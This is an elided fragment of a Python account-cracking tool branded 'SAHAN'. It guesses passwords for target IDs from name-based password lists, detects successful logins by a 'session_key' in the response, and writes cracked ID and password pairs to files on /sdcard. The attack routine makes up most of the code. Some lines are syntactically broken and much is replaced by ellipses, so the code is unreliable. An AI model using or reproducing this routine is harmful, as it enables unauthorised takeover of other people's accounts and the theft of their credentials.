...
logo= f'''
     .dP"Y8    db    88  88    db    88b 88 
`Ybo."   dPYb   88  88   dPYb   88Yb88 
o.`Y8b  dP__Yb  888888  dP__Yb  88 Y88 
8bodP' dP""""Yb 88  88 dP""""Yb 88  Y8 
{50*"-"}
    Tool Version :     1.0.3
    Thanks Alot  :     Asraful Ahmed Sahan
{50*"-"}'''
...
def qsbuy():
	try:
		...
		try:
			...
			os.system a=requests.get("https://github.com/Xiyad69/Key-Register.text.git").text
			qsbuy()
...
def main():
	xchker()
	os.system('rm -rf ...txt')
	a=requests.get("https://github.com/Xiyad69/Key-Register.text.git").text
	...
	if menu_opt =='1':
		...
		xchker()
		os.system('xdg-open https://github.com/Xiyad69/Key-Register.text.git')
		main()
	elif menu_opt =='4':
...
"upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
...
class crack_main():
	...
	def m1(self,iid,name,passlist):
		try:
			...
			sys.stdout.write('\r[SAHAN] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			fn = name.split(' ')[0]
			try:
				ln = name.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				if 'session_key' in po:
					print(' \033[1;32m[SAHAN-OK] '+roid+' | '+pas+'\033[0;97m')
					open('/sdcard/SAHAN_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				...
				if 'User must verify their account' in po:
					try:
						print(' \033[1;31m[SAHAN-CP] '+roid+' | '+pas+'\033[0;97m')
						open('/sdcard/SAHAN_cp.txt','a').write(roid+'|'+pas+'\n')
						break
					except Exception as e:
						pass
				else:
	...
	def pasw(self):
		...
		print(' Ok Ids Save In : /sdcard/SAHAN_ok.txt')
		print(50*'-')
		input('\n Press enter to back ')
		main()
